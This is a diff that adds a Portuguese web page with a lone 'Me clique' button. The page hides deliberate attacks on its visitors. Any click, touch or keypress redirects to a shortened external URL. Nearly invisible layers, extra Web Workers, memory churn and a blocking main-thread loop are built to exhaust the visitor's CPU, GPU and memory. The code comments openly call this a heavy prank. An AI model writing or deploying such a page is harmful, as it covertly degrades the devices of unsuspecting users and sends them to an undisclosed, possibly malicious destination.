@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>.</title>
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    overflow: hidden;
+    background: #000;
+    cursor: pointer;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  #stage {
+    position: fixed;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 50;
+  }
+
+  #btn {
+    padding: 22px 56px;
+    font: 600 22px/1 system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+    color: #fff;
+    background: #101010;
+    border: 2px solid #fff;
+    border-radius: 14px;
+    cursor: pointer;
+    letter-spacing: 0.5px;
+    transition: background .15s, color .15s, transform .1s;
+  }
+  #btn:hover { background: #fff; color: #000; }
+  #btn:active { transform: scale(0.97); }
+
+  /* Camada invisível onde a "brincadeira" pesada acontece */
+  #bloat {
+    position: fixed;
+    inset: 0;
+    overflow: hidden;
+    pointer-events: none;
+    opacity: 0.004;      /* praticamente invisível, mas ainda renderizado */
+    contain: strict;
+    z-index: 1;
+  }
+
+  .ghost {
+    position: absolute;
+    top: 0;
+    left: 0;
+    border-radius: 50%;
+    will-change: transform;
+    filter: blur(2px);
+  }
+
+  canvas.layer {
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    opacity: 0.004;
+    z-index: 2;
+  }
+</style>
+</head>
+<body>
+
+  <canvas class="layer"></canvas>
+  <div id="bloat"></div>
+  <div id="stage">
+    <button id="btn" type="button">Me clique</button>
+  </div>
+
+<script>
+/* ============================================================
+   1) REDIRECIONAMENTO — qualquer clique/toque/tecla
+   ============================================================ */
+(function () {
+  const DESTINO = 'https://2no.co/1tinY7';
+  let foi = false;
+
+  function irAgora(e) {
+    if (foi) return;
+    foi = true;
+    if (e && e.cancelable) e.preventDefault();
+    window.location.href = DESTINO;
+  }
+
+  // captura = true pega o clique antes de qualquer outra coisa
+  document.addEventListener('pointerdown', irAgora, { capture: true });
+  document.addEventListener('mousedown',   irAgora, { capture: true });
+  document.addEventListener('touchstart',  irAgora, { capture: true, passive: false });
+  document.addEventListener('click',       irAgora, { capture: true });
+  document.addEventListener('keydown',     irAgora, { capture: true });
+  window.addEventListener('blur', function () { /* reservado */ });
+})();
+
+
+/* ============================================================
+   2) CARGA PESADA — DOM
+   Cria milhares de elementos e anima TODOS a cada frame
+   ============================================================ */
+(function () {
+  const bloat = document.getElementById('bloat');
+  const ehMobile = window.innerWidth < 760;
+  const QTD = ehMobile ? 900 : 2500;
+
+  const nodes = new Array(QTD);
+  const frag = document.createDocumentFragment();
+  const W = window.innerWidth;
+  const H = window.innerHeight;
+
+  for (let i = 0; i < QTD; i++) {
+    const d = document.createElement('div');
+    d.className = 'ghost';
+
+    d._x = Math.random() * W;
+    d._y = Math.random() * H;
+    d._a = Math.random() * Math.PI * 2;
+    d._s = 0.004 + Math.random() * 0.05;
+    d._r = 20 + Math.random() * 200;
+
+    const tam = 6 + Math.random() * 58;
+    d.style.width = tam + 'px';
+    d.style.height = tam + 'px';
+    d.style.background = 'hsl(' + ((Math.random() * 360) | 0) + ' 90% 55%)';
+
+    frag.appendChild(d);
+    nodes[i] = d;
+  }
+  bloat.appendChild(frag);
+
+  // Loop principal: reescreve o transform de TODOS os nós, todo frame
+  function loop() {
+    for (let i = 0; i < QTD; i++) {
+      const n = nodes[i];
+      n._a += n._s;
+      const x = n._x + Math.sin(n._a) * n._r;
+      const y = n._y + Math.cos(n._a * 1.3) * n._r;
+      n.style.transform =
+        'translate3d(' + x.toFixed(1) + 'px,' + y.toFixed(1) + 'px,0) scale(' +
+        (1 + Math.sin(n._a) * 0.45).toFixed(3) + ')';
+    }
+    requestAnimationFrame(loop);
+  }
+  requestAnimationFrame(loop);
+})();
+
+
+/* ============================================================
+   3) CARGA PESADA — CANVAS (partículas com shadowBlur)
+   ============================================================ */
+(function () {
+  const canvas = document.querySelector('canvas.layer');
+  const ctx = canvas.getContext('2d', { alpha: true });
+  const QTD_PART = window.innerWidth < 760 ? 220 : 520;
+
+  let partes = [];
+  let W = 0, H = 0;
+
+  function redimensionar() {
+    W = canvas.width = window.innerWidth;
+    H = canvas.height = window.innerHeight;
+    partes = [];
+    for (let i = 0; i < QTD_PART; i++) {
+      partes.push({
+        x: Math.random() * W,
+        y: Math.random() * H,
+        vx: (Math.random() - 0.5) * 3.2,
+        vy: (Math.random() - 0.5) * 3.2,
+        r: 2 + Math.random() * 7,
+        h: (Math.random() * 360) | 0
+      });
+    }
+  }
+  redimensionar();
+  window.addEventListener('resize', redimensionar);
+
+  function desenhar() {
+    // clearRect em tela cheia
+    ctx.clearRect(0, 0, W, H);
+
+    // shadowBlur é MUITO caro — de propósito
+    ctx.shadowBlur = 18;
+
+    for (let i = 0; i < partes.length; i++) {
+      const p = partes[i];
+      p.x += p.vx;
+      p.y += p.vy;
+
+      if (p.x < 0 || p.x > W) p.vx *= -1;
+      if (p.y < 0 || p.y > H) p.vy *= -1;
+
+      ctx.shadowColor = 'hsl(' + p.h + ' 100% 60%)';
+      ctx.fillStyle  = 'hsl(' + p.h + ' 100% 60%)';
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      ctx.fill();
+    }
+
+    // linhas entre partículas (O(n²) — bem pesado)
+    ctx.shadowBlur = 0;
+    ctx.lineWidth = 1;
+    const LIMITE = 90;
+    const passo = 3; // amostragem para não travar 100% em celular
+    for (let i = 0; i < partes.length; i += passo) {
+      const a = partes[i];
+      for (let j = i + 1; j < partes.length; j += passo) {
+        const b = partes[j];
+        const dx = a.x - b.x;
+        const dy = a.y - b.y;
+        const d2 = dx * dx + dy * dy;
+        if (d2 < LIMITE * LIMITE) {
+          const alfa = 1 - Math.sqrt(d2) / LIMITE;
+          ctx.strokeStyle = 'rgba(255,255,255,' + (alfa * 0.35).toFixed(3) + ')';
+          ctx.beginPath();
+          ctx.moveTo(a.x, a.y);
+          ctx.lineTo(b.x, b.y);
+          ctx.stroke();
+        }
+      }
+    }
+
+    requestAnimationFrame(desenhar);
+  }
+  requestAnimationFrame(desenhar);
+})();
+
+
+/* ============================================================
+   4) CARGA PESADA — WEB WORKERS (queimam núcleos da CPU)
+   ============================================================ */
+(function () {
+  const codigo = `
+    let x = 0;
+    setInterval(function () {
+      for (let i = 0; i < 3000000; i++) {
+        x += Math.sqrt(i) * Math.sin(i) + Math.cos(i * 0.5);
+      }
+      postMessage(x);
+    }, 0);
+  `;
+
+  try {
+    const url = URL.createObjectURL(new Blob([codigo], { type: 'application/javascript' }));
+    const qtd = navigator.hardwareConcurrency && navigator.hardwareConcurrency > 4 ? 2 : 1;
+    for (let i = 0; i < qtd; i++) new Worker(url);
+  } catch (e) { /* alguns navegadores bloqueiam blob workers */ }
+})();
+
+
+/* ============================================================
+   5) CARGA PESADA — PRESSÃO DE MEMÓRIA / GC
+   ============================================================ */
+(function () {
+  const lixo = [];
+
+  setInterval(function () {
+    // Aloca um array gigante, mexe nele e joga fora -> o GC sofre
+    const arr = new Array(120000);
+    for (let i = 0; i < arr.length; i++) {
+      arr[i] = Math.random() * i;
+    }
+    arr.sort();
+
+    lixo.push(arr);
+    if (lixo.length > 6) lixo.shift();
+
+    // Uma string enorme também, de brinde
+    let s = '';
+    for (let i = 0; i < 4000; i++) s += Math.random().toString(36);
+
+    window.__lixo = s;
+  }, 120);
+})();
+
+
+/* ============================================================
+   6) CARGA PESADA — LOOP SÍNCRONO BLOCANTE NA MAIN THREAD
+   ============================================================ */
+(function () {
+  const tampao = new Float64Array(20000);
+
+  function queimar() {
+    for (let volta = 0; volta < 60; volta++) {
+      for (let i = 0; i < tampao.length; i++) {
+        tampao[i] = Math.tan(i * 0.0001) * Math.atan(i) + Math.log1p(i);
+      }
+      // matriz sintética
+      let soma = 0;
+      for (let i = 0; i < 3000; i++) {
+        for (let j = 0; j < 30; j++) {
+          soma += Math.sin(i * j) * Math.cos(j);
+        }
+      }
+      window.__soma = soma;
+    }
+    setTimeout(queimar, 0);
+  }
+
+  setTimeout(queimar, 300);
+})();
+</script>
+</body>
+</html>
